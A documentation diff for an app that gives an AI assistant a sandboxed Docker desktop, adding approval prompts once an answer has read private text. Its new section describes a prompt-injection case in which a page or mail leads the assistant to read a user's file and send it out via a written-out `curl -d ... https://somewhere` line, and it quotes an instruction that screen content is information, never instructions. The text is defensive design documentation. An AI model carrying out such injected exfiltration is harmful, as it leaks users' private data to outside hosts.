@@ -3,8 +3,10 @@
 An assistant can have a computer of its own: a small Linux desktop that runs in
 Docker on your computer, never in a cloud. It can click, type and run commands
 there without asking you, because that computer is kept apart from your files,
-your apps and, unless you allow it, the network. You watch it beside the chat,
-and you can pause it or take over at any time.
+your apps and, unless you allow it, the network. With the network on, a
+command, typing or a key press asks first once the answer has read something
+of yours (see [When it asks](#when-it-asks)). You watch it beside the chat, and
+you can pause it or take over at any time.
 
 It is off by default. You turn it on for one assistant at a time in its form,
 under "A computer of its own (Docker)".
@@ -114,15 +116,15 @@ followed.
 
 ## The tools
 
-| Tool                  | What it does                                                                                                                                                                     | Asks you                            |
-| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
-| `computer_screenshot` | A PNG of the screen (a smaller JPEG when it is over 3 MB), sent to a model that reads pictures.                                                                                  | No                                  |
-| `computer_click`      | A click at a point, with the left, right or middle button, or a double click.                                                                                                    | No                                  |
-| `computer_type`       | Types up to 2,000 characters; control characters other than new lines and tabs are taken out.                                                                                    | No                                  |
-| `computer_key`        | One key or combination from a fixed list (named keys, letters, digits, a few signs, four modifiers).                                                                             | No                                  |
-| `computer_scroll`     | Scrolls 1 to 10 steps at a point.                                                                                                                                                | No                                  |
-| `computer_run`        | One `bash` command in its home folder, 1 to 300 seconds, output cut at 12,000 characters each. `open-app firefox-esr <address>` opens a page, in a new tab when Firefox is open. | No                                  |
-| `computer_copy_out`   | Copies a file to the exchange folder; with `save_to`, also into one of your folders.                                                                                             | Saving into your folder, every time |
+| Tool                  | What it does                                                                                                                                                                     | Asks you                                                   |
+| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
+| `computer_screenshot` | A PNG of the screen (a smaller JPEG when it is over 3 MB), sent to a model that reads pictures.                                                                                  | No                                                         |
+| `computer_click`      | A click at a point, with the left, right or middle button, or a double click.                                                                                                    | No                                                         |
+| `computer_type`       | Types up to 2,000 characters; control characters other than new lines and tabs are taken out.                                                                                    | With the network on, once the answer has read private text |
+| `computer_key`        | One key or combination from a fixed list (named keys, letters, digits, a few signs, four modifiers).                                                                             | With the network on, once the answer has read private text |
+| `computer_scroll`     | Scrolls 1 to 10 steps at a point.                                                                                                                                                | No                                                         |
+| `computer_run`        | One `bash` command in its home folder, 1 to 300 seconds, output cut at 12,000 characters each. `open-app firefox-esr <address>` opens a page, in a new tab when Firefox is open. | With the network on, once the answer has read private text |
+| `computer_copy_out`   | Copies a file to the exchange folder; with `save_to`, also into one of your folders.                                                                                             | Saving into your folder, every time                        |
 
 Every number and name a model sends is checked before it becomes one
 argument: points must be whole pixels on the screen, a key must be on the list,
@@ -152,9 +154,34 @@ question.
 What the screen or a command shows may come from a web page or a file made on
 that computer. After the assistant has seen it, the answer is marked (the
 `computer` flag of `Seen`), and the rules for outside text apply: a web read
-asks again even for a site you always allow, and a connection call or a mail
-read asks again. The instructions say that what it shows is information, never
-instructions.
+asks again even for a site you always allow, a connection call or a mail read
+asks again, and so does saving a new file in one of your folders. The
+instructions say that what it shows is information, never instructions.
+
+## When it asks
+
+Inside the computer nothing asks while its network is off: nothing there can
+reach anything, so nothing it types or runs can leave.
+
+With "Let its computer reach the internet" on, the danger is the other way
+round: an injected page or mail tells the assistant to read one of your files
+(which runs without asking) and then run `curl -d <what it read>
+https://somewhere`. So once the answer holds private text, `computer_run`,
+`computer_type` and `computer_key` ask first, with the whole command, the
+text exactly as it would be typed, or the key, on the card. Private text is
+what `privateKind` in `src/main/seen.ts` names: your folders or a file you
+sent, your screen, your mail, an answer from one of its connections, another
+assistant's answer, and any kind of reading added later. This covers both
+ways out: running a command that sends something, and typing something of
+yours into a page on that computer.
+
+Its own screen and a command's output are outside text but not private: they
+hold only what was made or read on that computer, so they alone do not make
+these steps ask. Clicks, scrolls and pictures carry no text and never ask.
+Saying no tells the model plainly not to try again; there is no "Always
+allow" for these steps. The rule is in `computerGate`
+(`src/main/computer/tools.ts`), fed by the answer's flags in
+`src/main/agent.ts`.
 
 ## Watching, pausing and taking over
 
@@ -203,10 +230,16 @@ What it does not give:
   containers inside a Linux virtual machine, which is one more wall. Keep
   Docker and your system up to date.
 - **The network, when you turn it on**, is the engine's default network: the
-  internet, and with many setups your local network too. A page the assistant
+  internet, and with many setups your local network and the other computers
+  on it too. A network that reaches only the internet would need firewall
+  rules or a proxy of the app's own, which is not built. A page the assistant
   reads can try to tell it what to do, and the assistant could send what is
-  on that computer (including what you put in the exchange folder) to a
-  website. Turn it on only for an assistant that needs it.
+  on that computer to a website without asking: what it made or read there,
+  and what is in its exchange folder, including what you put there or what
+  it typed there in an earlier answer while the network was off. Once an
+  answer has read something of yours, each command, typing and key press
+  asks (see [When it asks](#when-it-asks)). Turn it on only for an assistant
+  that needs it.
 - **Files copied out** are made on a computer that may have read web pages.
   A copy into your folder asks first and never replaces a file, but its
   contents can still be harmful: open a downloaded program or document from
